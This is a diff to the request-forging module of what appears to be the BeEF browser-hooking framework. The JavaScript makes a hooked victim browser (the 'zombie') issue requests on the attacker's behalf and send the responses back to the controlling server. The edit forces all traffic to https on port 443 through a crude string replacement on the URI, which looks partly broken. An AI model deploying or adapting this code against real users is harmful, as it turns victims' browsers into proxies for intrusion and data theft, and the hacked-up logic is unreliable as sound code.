@@ -18,12 +18,17 @@ beef.net.requester = {
 	
 	handler: "requester",
 	
+	//This function makes the request the proxy sends to the zombie
 	send: function(requests_array) {
 
         for (i in requests_array) {
             request = requests_array[i];
-
-            beef.net.forge_request('http', request.method, request.host, request.port, request.uri, null, request.headers, request.data, 10, null, request.allowCrossDomain, request.id,
+	    
+	    if(!request.host || ! request.uri) //for some reason sometimes this 2 are undefined
+		continue;
+	    
+	   request.uri = request.uri.replace("http","https");
+	   beef.net.forge_request('https', request.method, request.host, 443, request.uri, null, request.headers, request.data, 10, null, request.allowCrossDomain, request.id,
                                        function(res, requestid) { beef.net.send('/requester', requestid, {
                                            response_data: res.response_body,
                                            response_status_code: res.status_code,
